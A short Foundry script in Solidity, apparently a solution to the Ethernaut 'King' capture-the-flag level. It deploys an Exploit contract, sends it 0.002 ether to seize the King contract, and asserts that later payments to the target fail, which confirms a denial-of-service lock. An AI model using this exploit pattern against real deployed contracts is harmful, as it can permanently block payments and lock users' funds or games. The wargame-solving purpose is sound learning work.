// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Script.sol";
import "src/king/King.sol";
import "src/king/Exploit.sol";

contract KingScript is Script {
    function yoink(address eoa, King target) public {
        vm.startBroadcast(eoa);
        Exploit exploit = new Exploit();
        exploit.bonk{value: 0.002 ether}(target);
        vm.stopBroadcast();
        (bool success,) = address(target).call{value: 0.1 ether}("");
        assert(!success);
    }
}
